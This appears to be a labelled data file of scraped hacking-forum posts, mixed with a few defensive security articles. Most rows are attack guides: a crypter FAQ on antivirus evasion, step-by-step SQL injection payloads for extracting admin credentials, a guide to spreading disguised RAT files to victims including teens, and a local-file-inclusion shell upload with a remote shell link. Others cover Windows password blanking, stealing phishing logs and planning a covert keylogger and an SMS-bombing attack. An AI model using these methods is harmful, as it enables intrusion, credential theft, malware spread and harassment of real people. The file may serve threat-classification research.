0	Crypter faq , im new here so i want to learn	""" What is a Crypter? A Crypter is a software encryption which encrypts your viruses, keyloggers, RATS or any other hacking tool from becoming detected by Antiviruses. A Crypter makes Antiviruses pretty much useless. This is because when encrypting any malware tool, the Crypter uses various encryption methods to bypass Antiviruses from analysing the output.   What does Scantime and Runtime mean? Scantime is a method used to bypass Antiviruses from analysing your encrypted files, while real time protection is enabled.Runtime is used to bypass Antiviruses when the encrypted file is executed. The Runtime method then decrypts the encryption in the memory. Generally all Crypters use the Scantime and Runtime method.   What is the Client? The client is the application and interface. Itâs where you browse and encrypt your data.   What is the Stub? The Stub is packed with junk or undetected code to help your encrypted file stay fully undetected for some time or maybe even weeks. When the stub eventually becomes detected, the file becomes detected by antiviruses when executed on the machine.   What is EOF? EOF is a short word for End of File. Some applications such as Bifrost and Cybergate require the End of file data to be Crypted without getting corrupted. If Crypters donât use this important functionality then the file output becomes corrupted.   What are Dependencies? .NET Crypters uses the .NET framework functionality, to make the Crypter function. Therefore .NET Crypters requires the .NET 2.0 for the encrypted data to execute. Some Crypters uses no dependencies and this means the victimâs machine doesnât require .NET in order for the file to work.   What is a file binder? A file binder is used to bind executable file to other files such as .PDF, .DOC, .GIF and etc.   What is a Downloader? A downloader downloads and executes the file which was uploaded on the link, on the first run. A downloader reduces the size of the file.   What is the Startup option? When Crypting files it is important to select the Startup option. When the file gets executed on the machine and if the Startup option is not checked, then this means when the machine is restarted you will lose the client.   What is Pump File? A file pumper increases and adds bytes to the Crypter file to increase the output size.   What does Melt file do? When the Crypted file is executed, the file itself melts and deletes itself from the machine.   What does Hide file do? When the Crypted file is executed it stays in the same place, but it changes its view mode from visible to hidden.   What is Delay Execution? Delay execution typically delays the execution of the decryption process, by some seconds. This can also become useful when bypassing popular antiviruses on runtime. This can also make the Crypted file look less suspicious.   What are Antis used for? Antis are used to bypass certain applications such as Anti-Sandboxie, Anti VM-Ware and etc. For example when the Crypted file is executed in Sandboxie, the Crypted file will refuse to execute in Sandboxie because the Anti-Sandboxie option was checked before Crypted.   What is a Botkiller? A Botkiller is uses to kill other Crypted files which are installed on the machine.   What is Persistence? The persistence option makes the Crypted file harder from becoming killed by Botkillers.   What is a USG? A USG is a generator that produces unique stubs. Each Stub is different and itâs used to crypt the stated file. The Crypter Fudness does not last so long so therefore the USG helps the Crypter by giving out Fully Undetectable (FUD) outputs.     I THINK THIS WOULD HELP ON SOMEONE! """

Well this is how you change all Windows Passwords with a few simple commands   What you need?   1. USB - With Linux  2. Live CD with linux   Either one works   Plug it in  load up linux download     Get Ubuntu -   type in Code: apt-get install synaptic Open up synaptic    search for chntpw     Either A Mark for install or Mark for Reinstall   right click - click propriters  go to installed files and you should see where it installed to for example mine is located here   Code: /pentest/passwords/chntpw /code]         Execute the following commands [CODE] fdiks -l   ( find out the location your windows is partitioned on )  mount /dev/sda1 /mnt/  ( Mine is called sda1 so mount sda1 to folder /mnt/  cd /mnt/WINDOWS/system32/config  chntpw -i sam  ( i for interactive mode ) or  chntpw Administrator sam  ( to edit Administrator account instead of going through interactive mode) You will now be given the option to blank out the password by pressing  Ã¢â¬Å1″, as well as several other ways to change the user, such as upgrading  their account to an administrator.   Press Ã¢â¬Å!Ã¢â¬Â to exit the Edit User Screen and then press Ã¢â¬ÅqÃ¢â¬Â to exit chntpw and you will be prompted to save any changes.     BE SURE TO SAVE THE HIVE FILE   once your out type Code: unmount /sda1 Restart windows  Type in your new password or if you made it blank in chntpw it should go straight to the desktop]     and that is how you edit any type of windows passwords     Enjoy :shout: """
0	[TUTORIAL][ASP] MSSQL INJECTION TUT {N00B Friendly}	""" Hello IHF users! Heres my first tut for u alll.... Please Reply if you liked, disliked or have any problem regarding this... BASIC ERROR-BASED MSSQL Injection So first of all we will find some site that is Vulnerable and is on .asp So assume that u got a site with the name of Code: http://www.example.com/ Code: http://www.target.com/   now find page where the site is vul to sql injection... You can check the Vulnerability by adding single quotation   at the end of URL like Code: http://www.target.com/product.asp?id=13   If u get this error... Code: Microsoft OLE DB Provider for ODBC Drivers error 80040e14 [Microsoft][ODBC Microsoft Access Driver] Syntax error in string in query expression department_id=1024. /deptdet.asp, line 122 Then this means the site is vuln to sql injections... Now we are going to find the columns in it... Normally we use -- at the end of string but in this case we will be using # Code: http://www.target.com/product.asp?id=13 order by 1#   Suppose that the site has 10 columns...when you will use the query \""order by 1#\"" (without double quotations) You will not get any error...the page will load normally...but when you will use the query \""order by 11#\"" (without double quotations) you will get an error this means that the site has 10 columns... So we will have an error on this query Code: http://www.target.com/product.asp?id=13 order by 11#   But when we will use this query, we will not get any error. Code: http://www.target.com/product.asp?id=13 order by 10#   This tells us that the table has 10 columns.  If this is not working use string:  Code: http://www.target.com/product.asp? and 1=2 ORDER BY 10--  or http://www.target.com/product.asp? and 1=2 ORDER BY 10# This should work :), Now we will write the query as... Code: http://www.target.com/product.asp?id=13 union select 1,2,3,4,5,6,7,8,9,10#   So now in next step we need name of a table to get number of targets visible column from all ..  let me explain bit , like in simple sql injection we use  Code: union select 1,2,3,4,5,6 -- and we get a number to get information from site , in this we need a table name to get that number of visible column , so to get that number we are going to add name of table after union select 1,2,3,4,5,6,7, ..,10 in this scripts of getting table names dont work most times i tried some of them so we will add name of tables manually normally name of tables are \"" admin,tbladmin,tbl_admin,user,users,login,info,email\"" etc . Suppose in the site we got admin table that is visible. Now our url will look like Code: http://www.target.com/product.asp?id=13 union select 1,2,3,4,5,6,7,8,9,10 from admin#   After this we will get number of largest visible column which we can use to get data from site. Suppose we got 3,7and 6 columns that are visible... So now we are going to use 3 to get information now all we have to do is just put the name of column instead of 3 in string and we will get username and password , Now our URL will look like Code: http://www.target.com/product.asp?id=13 union select 1,2,name,4,5,6,7,8,9,10 from admin# Suppose we got a username instead of the number 3. and then change column name with passwords column name you will get the password ;) URL will be like Code: http://www.target.com/product.asp?id=13 union select 1,2,passwords,4,5,6,7,8,9,10 from admin# Hopes i will helped you , in this type of injection we dont get much working scripts to get tables etc if i get working ones i will update this tut soon ... by me for IHF , enjoy !! ^|^ Having Problem in tut? Ask questions here :) ::cool::[COLOR=\""#FF0000\""]  IF YOU LIKED THE TUT... Take a moment to +Rep and +Thanks me.... itll encourage me to post more 4 u... :) [/COLOR] JAI HIND! """

The HF community sent me in the direction of Darkcomet as it had the great advantage of built in UPnP... Universal Plug and Play (Forwards your port automatically if your Router supports it) the worry of having to manually change my routers settings was now gone! for a while anyway... The time eventually came for me to upgrade to paid software for more features and a more stable server. I Still had no idea how to portforward so i searched online for a program that replaced Darkcomets great port forwarding tool. Heres the program i found and still use to this day  \""UPnP Port Forward Utility - ver 1.00\"" Why? Because it works perfectly, takes about 15 seconds to forward a new port, and i currently have no need to use anything else. The Main screen above shows all of your open ports and the program behind it. After clicking \""add new entry\"" you will be prompted to enter these details. Give the portforward a name (Blackshades server/Testing port) etc.. and then \""save changes and exit\"" Foolproof Tips in Spoiler Internal IP address will be shown as one of your \""destination ips\"" on the mainscreen. External and internal port should be set as the same number.

0	[TUT] Spreading tut for guys (easy one and effective one )	""" I assume that u guys already got your rat setup and in working condition ( FUD ). So am not going in to that part.  I am just telling here a way to spread your server and get some victims. And btw this is my first tut ever so ill need your feed back guys. Ewhore Spreading   Introduction: Ewhore Spreading is one of the easiest spreading methods. It will get you a lot of victims and , can earn you some good cash if you add more black hat into it. Preparations: Once you got your server FUD you need to make sure you bind it with a picture and add image icon.  Here comes the important part. Change the extension of your file from .exe to .com and rename your picture to your msn address. Example:   [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ .  That way your server wont be so suspicious. Not many people knows about that so dont worry about getting caught.  Some websites on which you can spread your server : Hidden Content:  You must reply to see links -Not good for a lot of bots but you can get some rich pedos. Hidden Content:  You must reply to see links -You will get a lot of teens from there. Hidden Content:  You must reply to see links -Still good but high risk getting banned from admin Hidden Content:  You must reply to see links -A lot of victims here. Hidden Content:  You must reply to see links -Not really good but you can try it. Hidden Content:  You must reply to see links -A lot of traffic.Best one to spread. Over all Idea: Ewhoring spreading is good but involves a lot of work. Its not the same thing as torrent so you just do something else and get victims. Ive done it few times and believe me it brought me a lot of bots. This spreading method can bring you a lot of cash if you include \""Ewhoring\"" with it. This method takes time and persistence and Its the one I would suggest you the most. Ill soon be doing the tut for some other spreading methods soon :4: """
0	Local File Inclusion Vulnerability Demonstration - Shell Upload	"""   Local file inclusion is a very popular web application attack, It was very common few years back. However now a days you will rarely find websites vulnerable to this attack. However a single vulnerability can result in getting your website compromised. We have already written an article on Directory transversal attack. Therefore I believe that we need no to go in details about the attack. You might know avinash by now the author of the previous article How Hackers Are Hacking Into Websites On Shared Hosts. However in this article he will demonstrate a local file inclusion vulnerability and he will enhance the attack by uploading a shell on the website. Here are some of the common parameters which are vulnerable to local file inclusion or remote file inclusion attacks. index.php?homepage= index.php?page= index.php?index2= Requirements: 1) A Vulnerable Website 2) Remote shell (  http://www.sh3ll.org/egy.txt  ) 3) User-Agent switcher (  https://addons.mozilla.org/en-US/firefox...-switcher/  ) 4) Mozilla Firefox The first thing which a hacker will do while finding a LFI vulnerability is to locate the /etc/passwd file. This file indicates that a local file inclusion vulnerability is present in the website. The image below explains the whole story Ã¢â¬ÅrootÃ¢â¬Â is the username, followed by Ã¢â¬ÅxÃ¢â¬Â which happens to be the password, however here itÃ¢â¬â¢s shadowed, which means that itÃ¢â¬â¢s present is /etc/shadow file. Which is only accessible when you have root privileges. Next the hacker will check for /proc/self/environ. So change your path to /proc/self/environ/. The /proc/self/environ/ page should look something like this if the file exists, not all sites have it. Once the local file inclusion vulnerability has been identified , the hacker will try to perform remote code execution and try to some how to further acesss. This can be done by uploading a PHP backdoor. For that purpose a commonly used tool is Useragent switcher. Which can be downloaded from the link above.  The hacker edits the useragent and changes code inside to the user agent to the following: Select your User-Agent in Tools > Default User Agent > PHP Info (Or whatever you User Agent is called) After refreshing the website, He then searches for the keyword \""disable_functions\"" (Ctrl+F Search function) disable_functions | no value | no value The above function tells us that website is vulnerable to remote code execution and now we can upload the PHP backdoor. On the finding that the website is vulnerable he then tries to upload the shell by using the following command: Where the above code uploads a PHP backdoor in a text form and later renames it to .php. Now the shell has been successfully uploaded. Once the PHP backdoor has been uploaded it will look like the following: Thanks :D """

2	Session Hijacking in Instagram Mobile App via MITM Attack [ 0-DAY ]	""" In this  post, I am going to share a new critical issue that I have identified on  Instagram Mobile App. During my tests on their android app, I have  set-up a lab to pentest the app. Then I started using the app on my  phone, and monitoring the traffic in the network using WireShark,  looking for evidence for unencrypted data that goes through the network  or a technique to make this data unencrypted (if it was encrypted). As  soon as I logged into my account on my phone, Wireshark has captured  unencrypted data that goes through HTTP. This data includes: The  pictures that the victims watching, The victims session cookies, the  victims username and ID.   Hidden Content:  You must reply to see links     Hidden Content:  You must reply to see links          I  was shocked after seeing the results, it is unbelievable that Facebook,  the company that is responsible for Instagram, did not insure that the  data is secured and goes through HTTPS.        Then, I took the session cookies and used it in my computer, and simply Ã¢â¬ÅThe Victims Session Has Been HijackedÃ¢â¬Â.   Hidden Content:  You must reply to see links            I have reported this issue to Facebook, and they emailed me saying:   Hidden Content:  You must reply to see links          The security member said:Ã¢â¬Â Facebook accepts the risk of parts of Instagram communicating over HTTP not over HTTPSÃ¢â¬Â.  If this unencrypted data can lead to session hijacking and stalking Instagram users, this may raise an eye-brow of suspicious. Timeline: Jul 24, 2014 4:35am Ã¢â¬â Reported the issue. Jul 24, 2014 4:38am Ã¢â¬â Received a confirmation email of receiving the submission. Jul 24, 2014 9:45pm Ã¢â¬â  Received the first response from Facebook Security. Jul 24, 2014 9:45pm Ã¢â¬â I Asked for a disclosure. Jul 24, 2014 11:56pm Ã¢â¬â Received the second response from Facebook Security. Recommendation:        Until a patch is released ( which there is no specific date for  releasing a patch that has been assigned by Facebook), do not use  Instagram Mobile App. Instead, use the normal website, it is generally  secured and encrypted. Final Thoughts:        It is unbelievable that a company such as Facebook does not take  the maximum measure to insure the security of their users. Right now, I  believe this issue might be getting exploited in the public by  surveillance and agencies. """

There are some hackerÃ¢â¬â¢s breaks into your computer without using any impressive programming skills but trying to find words to guess as your password.  Normally people use their name, house number, mobile number and word Ã¢â¬ÅpasswordÃ¢â¬Â as a password . If you have very simple password then a hacker can hack your computer very easily.  To safe your computer from hackers there is a best way to create a tricky password . Here I will tell you some different type of tricks to make your password that canÃ¢â¬â¢t guess easily by any body. Use the maximum characters in your password.  Always set the password using maximum characters length, because it is simple method, if your password is longer then it is very difficult to guess.  Use the combination of lower-case and upper case letters in your password. Normally computer users use the lower case in password selection but it is best practice to use the combination of both (lower-case and upper case). So using different cases in your password makes it much more difficult to crack.  Use the combination of letters and numbers in your password.  When you mix both letters and numbers just like one letter and one number then your password is more incomprehensible.  Avoid using the name of your family members as password.  Always try to avoid the name of your child, spouse, city and country name as password, because if any body knows about your personal lifeÃ¢â¬â¢s details then they try to use these detail to guess your password.  Use any tools to create random password. There are many third party tools are available to create the random password. You can create passwords containing a very difficult Ã¢â¬âto-guess collection of random characters with these tools.

0	Md5 Cracking Tutorial	"""   Md5 Cracking Tutorial To Day I Present one Of The Most Successful ways To Decrypt MD5 Hashes by useing Rainbow table . First What Is MD5 ? MD5 is an algorithm that is used to verify data integrity through the creation of a 128-bit message digest from data input (which may be a message of any length) that is claimed to be as unique to that specific data as a fingerprint is to the specific individual. MD5, which was developed by Professor Ronald L. Rivest of MIT, is intended for use with digital signature applications, which require that large files must be compressed by a secure method before being encrypted with a secret key, under a public key cryptosystem. MD5 is currently a standard, Internet Engineering Task Force (IETF) Request for Comments (RFC) 1321. According to the standard, it is \""computationally infeasible\"" that any two messages that have been input to the MD5 algorithm could have as the output the same message digest, or that a false message could be created through apprehension of the message digest. MD5 is the third message digest algorithm created by Rivest. All three (the others are MD2 and MD4) have similar structures, but MD2 was optimized for 8-bit machines, in comparison with the two later formulas, which are optimized for 32-bit machines. The MD5 algorithm is an extension of MD4, which the critical review found to be fast, but possibly not absolutely secure. In comparison, MD5 is not quite as fast as the MD4 algorithm, but offers much more assurance of data security. How rainbow crack Work ?

1	Secret Backdoor To Many Websites	""" see this alll Quote: Ever experienced this? You ask Google to look something up; the engine returns with a number of finds, but if you try to open the ones with the most promising content, you are confronted with a registration page instead, and the stuff you were looking for will not be revealed to you unless you agree to a credit card transaction first.... The lesson you should have learned here is: Obviously Google can go where you cant. Can we solve this problem? Yes, we can. We merely have to convince the site we want to enter, that WE ARE GOOGLE. In fact, many sites that force users to register or even pay in order to search and use their content, leave a backdoor open for the Googlebot, because a prominent presence in Google searches is known to generate sales leads, site hits and exposure. Examples of such sites are Windows Magazine, .Net Magazine, Nature, and many, many newspapers around the globe. How then, can you disguise yourself as a Googlebot? Quite simple: by changing your browsers User Agent. Copy the following code segment and paste it into a fresh notepad file. Save it as Useragent.reg and merge it into your registry. Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent] @=\""Googlebot/2.1\"" \""Compatible\""=\""+http://www.googlebot.com/bot.html\"" Voila! Youre done! You may always change it back again.... I know only one site that uses you User Agent to establish your eligability to use its services, and thats the Windows Update site...

0	Hacker Tricks And Prevention Techniques	""" In movies or TV series where hackers are involved, we may have seen them apply their computer knowledge in order to perform certain hacker tricks that saved the day. From \""The Matrix\"" to \""Swordfish\"", hackers have been able to elevate themselves to the level of heroes with only a keyboard and a mouse. However, hackers attacks and hacker prevention is more difficulty, and complex, in real life. Hollywood has a tendency to oversimplify things so the general public can understand them. After all, only a small percentage of the population has enough skills to perform this kind of demonstrations. So, if you want to prevent hacking there are some basics that need to be learned first. Tricks And Techniques Employed By Hackers To Break Into Your System The first most common technique used technique used by hackers is scanning. Hackers have created tools that scan computers for weak spots. It can be an operating system that hasnt been upgraded or a port in the computer that it is open without the knowledge of the user. Hackers use this \""open window\"" to get inside your computer in order to do whatever they want to do. The interesting thing about this is that these hacker tools are available for free in the Internet. So, with a couple of hours of instructions, almost every computer user can become a hacker. Another way that hackers can access your machine is through malware: programs designed to capture vital information from your computer, like login users and passwords. Malware could be hidden in a PowerPoint presentation sent by email or even in an innocent Instant Messenger message window. How To Prevent Hacker Attacks Hackers are always looking for a way to get into computers of other persons. It can be something as simple as phising confidential information (like credit card or bank account numbers) to complex hacking routines that use your computer as a repository for illegal content (like music or movies with copyright). Unfortunately there is no magical software to prevent hackers; and it will never exist. It doesnt matter how much money or resources you invest in designing the perfect system, someone will find the way to crack it. Even the biggest government agencies like NASA, CIA and NSA have been victims of hackers. And the same thing happens in the private sector with companies like Citigroup or Wal-Mart. """
3	Expert Advice on Keeping Your Network Safe by Blocking Dangerous Hacker Attacks	""" Expert Advice on Keeping Your Network Safe by Blocking Dangerous Hacker Attacks The stories go on and on about another individual having their personal information stolen from their computer by some hacker. While it is true that hackers do get peoples information, and they will keep on getting that information, it is also true that having intrusion detection software can help. And even better, to be hacker safe intrusion prevention system is by the same software. Why You Need Intrusion Detection Doors can be opened to hackers in varied ways. Two of the most common ways by which they can gain access to your computer is simply through emails, or Web pages that you visit that have spyware, or trojans (a file which looks innocent, but actually will later open doors to a hacker) attached to them. Other ways are robot spiders sent out over the Internet to find unprotected computers, and open doors. Some say that every computer attached to the Internet may be attacked by such a spider as many as 50 times each day. So, if you do not have an intrusion prevention system in place, up-to-date, then you may have regular unexpected visitors - and you may not even know it. Others say that 9 out of 10 computers have some sort of spyware, or malware on them. Could you be one of them? This article will show you what is available on the market for your protection - and much of it can be obtained for free. The spider robots work automatically - looking for and identifying computers on the Internet that have doors, or ports, open to them. This information is then reported back to the hacker - knowing which computers to target - and which port to use. For this reason, every now and then, Microsoft will come out with a new patch for Windows, in order to close some faulty door that hackers have discovered and been using. What Is Intrusion Detection? Network Intrusion detection software is a must-have these days. Each companys software will vary somewhat (for copyright and originality purposes), but you do need one for your own network, or home computer. It differs from a firewall in that the purpose of a firewall is to stop unauthorized external contacts with your system. These offer hacker prevention largely for contacts from outside the network. Most of these will now notify the owner or network controller of intrusion attempts. Network intrusion detection systems, on the other hand, will give you warnings about events that take place within the network itself. """

Congratulations, you stole from a phisher! Step 3 However most of the time the hoster will have shut down the phisher. There is a nice trick for this. Just use googles cache. I love the cache <3! Then save, and you stole from the phisher! Step 4 You need to check the quality. For this you can randomly choose accounts and try them. But a better method are account checkers. You insert your list there and that program checks all of them for you. They are great. Just search for them, Let them check, and save the accounts that work. Step 5 Now have fun. Also if you find a phisher you should try: Code: www.site.com/log.txt www.site.com/log_.txt www.site.com/_log.txt www.site.com/defaultlog.txt www.site.com/lol.txt www.site.com/loz.txt   """
0	Top Tips to Become a Hacker	""" Top Tips to Become a Hacker Certainly there are many sources of information available that can give you computer hacking basics. There is actually some misconception about who a real hacker is. Hacking computers is performed by one who knows computers very well - even the extra tricks of a computer and electronics. He can easily tweak these according to his needs and become hacker. This is the way the term was used when Bill Gates was inventing Windows. Those who are often referred to as hackers today, should actually be called \""crackers\"" - people who do not have unauthorized access, like a safe-cracker. If you doubt me, and want to know how to be a hacker then do a search on the term \""professional hacker,\"" and you will find many professional and legitimate computer training courses being offered. They are the ones learning the real hacker secrets. What Are The Basics Needed To Become A Hacker Everyone has heard of one individual or another that was caught while hacking computers that belonged to this or that organization. Because hacking into computers is highly illegal, it should be mentioned that this article will not mention any real specifics about the subject, and this author would rather gladly encourage you to become a real hacker - professionally. This article, will however, give a brief overview of criminal hackers, some of their methods, and a few things you can do to make your own computer safer from hack attacks. Here are those things you need to learn on how to become a hacker.     *       Learn Computers       It should go without saying that the first thing that is needed is to learn about computers. This means study. A lot of reading is involved along with just plain old-fashioned learning how to use a computer. Then, of course, there are the special aspects of computer study. The places where the tips are learned is often two-fold: a friend who has access to a computer, and a variety of places on the Web. But this is also an interesting thing - if a young person has the ability to learn, and wants to learn can use hacking tutorials- then why not take the time to learn the right things - things that can earn him a lot of money in the legit world? Is it possibly that it could be the friend he has that turns him away from the good? """

In case of dictionery attack, provide the path of dictionery file. 6. After selecting a meathod click on start attack button. ****************************************************************************************************************************************************************************   How to Remove a pdf  password protected file?   1.Open the secured PDF file. You can use Adobe Acrobat to do this. You must be the creator of the document, or have the password for this method    to work. 2.Click the Secure button. This button is located in the Tasks toolbar. It is easily identified by the padlock icon.    Choose the Remove Security option if you want to completely unsecure the PDF file. If you previously assigned a Permissions Password to the            secure PDF file, you will have to enter it at this time to complete the process. 3.Change encryption settings. If you would rather adjust the encryption settings as opposed to unsecuring the PDF file, Click on the \""Permission            detail\"" link under the Secure button.    Click \""Change settings\"" in Document properties under Security tab after selecting \""Certificate security\"" in drop-down list.

I am one of only three people who has access to this information. I do not wish to divulge any more information than that. I have decided that I wanted in on the hacking business to see just how much I can benefit from having access to this information. I am a lurker, and I dont really intend on speaking that much, at least initially.  A quick question, for lack of a better place to ask right now. Is it possible to configure a keylogger on my home computer to send me periodic emails with all of the captured strokes, put that keylogger on a flash drive that will automatically install it to the work terminal, and then leave it running as long as that computer is being used? I am going to be the one primarily using the computer, but I dont want to have to always do something to activate it when I am on. I am googling guides and reading stuff online, but I figure I will also use this thread to state my intentions on using this website and I figure it as good a time of any to get into that business. Already have two sets of information, and Im looking to grow this with as many people as possible. As far as my interests go, I play a bunch of games like League of Legends, and Counter Strike: Global Offensive. I also am a huge fan of anime/manga and love talking about it. May we become the best of friends everyone! """

I am trying to figure out how to go about with an sms bomber without getting it immediately shut down as a spam email account. My thoughts are to use a burner email that may not be as heavily monitored for spam, but Im not sure how to do this.. The point of this being to render the victims phone useless, if there are other ways to go about this I would be up for that as well.  perfect world end result desired: start up sms bomber knowing email wont be shut down. Possibly have burner emails refreshing automatically to keep the victim from blocking them? send indefinite amount over indefinite period of time until victim is forced to change phone numbers/phone crashes etc.. The problems I am having, I dont quite understand what the port #s are so I dont know to what degree their significance is. And that first problem I believe would solve the second problem I have which is I dont know how to go about obtaining (if at all possible) the port #s for one of these temporary email services. Any and all feedback is welcomed. And I very much look forward to delving into other matters with this community in the future     ***Once again I apologize if this is something that is not tolerated in this community, if so I will take note but I do still wish to join this community. """

0	How to Encrypt your System  Partition	"""   System Encryption VeraCrypt can on-the-fly encrypt a system partition or entire system drive, i.e. a partition or drive where  Windows is installed and from which it boots. System encryption provides the highest level of security and  privacy, because all files, including any temporary files that Windows and applications create on the system  partition (typically, without your knowledge or consent), hibernation files, swap files, etc., are always  permanently encrypted (even when power supply is suddenly interrupted). Windows also records large amounts of  potentially sensitive data, such as the names and locations of files you open, applications you run, etc. All  such log files and registry entries are always permanently encrypted too. System encryption involves pre-boot authentication, which means that anyone who wants to gain access and use  the encrypted system, read and write files stored on the system drive, etc., will need to enter the correct  password each time before Windows boots (starts). Pre-boot authentication is handled by the VeraCrypt Boot  Loader, which resides in the first track of the boot drive and on the VeraCrypt Rescue Disk. Note that VeraCrypt can encrypt an existing unencrypted system partition/drive in-place while the operating  system is running (while the system is being encrypted, you can use your computer as usual without any restrictions). Likewise, a VeraCrypt-encrypted system partition/drive can be decrypted in-place while the operating system is running. You can interrupt the process of encryption or decryption anytime, leave the partition/drive partially unencrypted,  restart or shut down the computer, and then resume the process, which will continue from the point it was stopped. VeraCrypt Insaller can be found here:  CLICK HERE Virus Scan Results: *Skip Ad for Results VeraCrypt_Setup_1.12 =  LINK   To encrypt a system partition or entire system drive, select System > Encrypt System Partition/Drive and then follow the   instructions in the wizard.

3	Few questions from a new hacker :)	""" Hello all. Im pretty new to the hacking scene, I have played with keyloggers before to steal players accounts for an online game I played, but thats about the extent of my hacking knowledge. I am really mainly interested in Web Hacking, such as SQLi, XSS etc. I am really interested in hacking into website DBs and the like as well.  Here are my questions -  1. Should I be using Linux? I see a lot of pentesters and hackers use a Linux distro. 2. What area should I focus on for what I want to learn? Also, is it okay to learn SQLi by using tools, or should I learn manually first? Im really interested in learning as fast as possible, so I figured the help of tools would help with this. 3. What are the most popular tools used for Web hacking, SQLi, XSS? Im not asking for DL links to them or anything, I dont mind finding them on my own, I just need to know what the best tools to use are. 4. Should I focus on one thing, and then move onto the next thing? Like should I worry about learning just SQLi, and once I have a decent understanding of it, move on to XSS? Also, any tips or suggestions you might have for a beginner would be awesome :) I would greatly appreciate any info or help anyone could give me. Hopefully one day Ill have the knowledge to do the same for someone else.

0	How to Encrypt your System Partition	"""   System Encryption VeraCrypt can on-the-fly encrypt a system partition or entire system drive, i.e. a partition or drive where  Windows is installed and from which it boots. System encryption provides the highest level of security and  privacy, because all files, including any temporary files that Windows and applications create on the system  partition (typically, without your knowledge or consent), hibernation files, swap files, etc., are always  permanently encrypted (even when power supply is suddenly interrupted). Windows also records large amounts of  potentially sensitive data, such as the names and locations of files you open, applications you run, etc. All  such log files and registry entries are always permanently encrypted too. System encryption involves pre-boot authentication, which means that anyone who wants to gain access and use  the encrypted system, read and write files stored on the system drive, etc., will need to enter the correct  password each time before Windows boots (starts). Pre-boot authentication is handled by the VeraCrypt Boot  Loader, which resides in the first track of the boot drive and on the VeraCrypt Rescue Disk. Note that VeraCrypt can encrypt an existing unencrypted system partition/drive in-place while the operating  system is running (while the system is being encrypted, you can use your computer as usual without any restrictions). Likewise, a VeraCrypt-encrypted system partition/drive can be decrypted in-place while the operating system is running. You can interrupt the process of encryption or decryption anytime, leave the partition/drive partially unencrypted,  restart or shut down the computer, and then resume the process, which will continue from the point it was stopped. VirusTotal Scan Results: 0/56 VeraCrypt_Setup_1.12.zip =  CLICK HERE  for results VeraCrypt Insaller can be found here:  CLICK HERE Install and follow the wizard.To encrypt a system partition or entire system drive, select System > Encrypt System Partition/Drive and then follow the instructions in the wizard. To decrypt a system partition/drive, select System > Permanently Decrypt System Partition/Drive.   """

1	Removing Tracking Software From This Laptop?	""" A few years ago I was let go from my IT job at this company. A few months later I realized I still had one of their laptops floating around my apartment (not a great housekeeper). By that point it felt too awkward to bring it back, but I also knew I couldnt use it because wed recently rolled out security tracking software to all our laptops. I dont recall the name of the program but basically I knew if I ever let this thing on the internet Id be screwed. Its been hanging around ever since. The laptop is a Dell Latitude 6330 and I wouldnt mind getting some use out of it. Its either that or I find a lake to throw it in. I didnt personally roll out the tracking software but I knew the guy who did. He claimed that it was flashed into the BIOS and would be very difficult to remove. I havent seen anything like that in my Google searches though. If not for that annoyance Id just put a new hard drive in it and go. Anyone familiar with this sort of thing? Ok I finally found the right combination of keywords for Google. The thing is real, Dell refers to it as a \""persistence module\"" and it really is part of the BIOS. It will automatically reinstall the tracking software even if I replace the hard drive. I found the following possible crack: 1) START>SETTINGS>CONTROL PANEL> ADMINISTRATIVE TOOLS> SERVICES> find RPC ( Remote Procedure Call ) NET and/or Service. Right click and Properties, set to Automatic and stop the serive. 2) C:\\WINDOWS\\SYSTEM 32\\ Find these 4 files RPCNET.dll + RPCNETP.DLL + RPCNET.EXE + RPCNETP.EXE ( Do the following to each file ) 3) Delete each file. DO NOT REBOOT. Open WORD PAD. Type and \""Save As\"" ( without quotes ). Name the file as the one it will replace above. Do this for all 4 files. Once they are all replaced with the \""VOID\"" (bogus file ) Right click on each file and change the attribute to READ ONLY > APPLY > OK. To check and make sure it has worked, reboot your machine. Go to Services and check your RPC process and see if it has re started. If it restarted then you did something wrong with the above files, retry and reboot and recheck. Remember, if you delete one or all the files without stopping the service the files WILL come back automatically. Also you will not be able to delete RPCNET.exe if the service IS started. It must be done in the order above. """

Ransomware is a growing threat to the evolution of cyber criminals techniques in an attempt to part you from your money. Typically, the malicious software either lock victim’s computer system or encrypt the documents and files on it or in some cases both, to extort money from victims.  Most often ransomware victims end up paying off crooks either due to the threat of losing their important files or in panic as the threat pretends to be from some government agency.  Though IT professionals and security companies have been dealing and fighting back with the ransomware threats, security professional Jada Cyrus has compiled a  \"" Hidden Content:  You must reply to see links \""   or  \""Ransomware Removal Kit\""  and made it available for free online. Ransomware removal kit - Download for Free  The Ransomware Malware Removal kit supports  Hidden Content:  You must reply to see links  variants along with instructions on how to perform the necessary tasks. Quote: \"" You should never pay the ransom, \"" Cyrus says. \"" This will only reinforce this type of attack. According to most security intelligence reports, criminal enterprises are already making large profits from ransomware .\"" The ransomware response kit comes with the removal tools to combat the following variants of malware strains:  CryptoLocker:  CryptoLocker removal tools and Threat Mitigation CryptoLockerDecrypt:  FireEye Tool to decrypt files encrypted by the CryptoLocker ransomware TrendMicro_Ransomware_RemovalTool:  General ransomware removal tool from TrendMicro FBIRansomWare:  FBIRansomWare Removal Tools CoinVault:  CoinVault ransomware removal tools TeslaCrypt:  Tool for removing this variant of CryptoLocker ransomware Cyrus encourages system administrators and IT professionals not to pay the ransom to the cyber criminals. Instead, they should first remove the infected machine from the corporate network to prevent the spreading of malware. Once this is done, the users should then attempt to identify the type of ransomware their machine is infected with. They should take images of the encrypted box before removal for later analysis. Once the type of ransomware is identifiable, you have the above option to try and decrypt files and remove the ransomware threat from the infected system with the help of the kits removal tools.

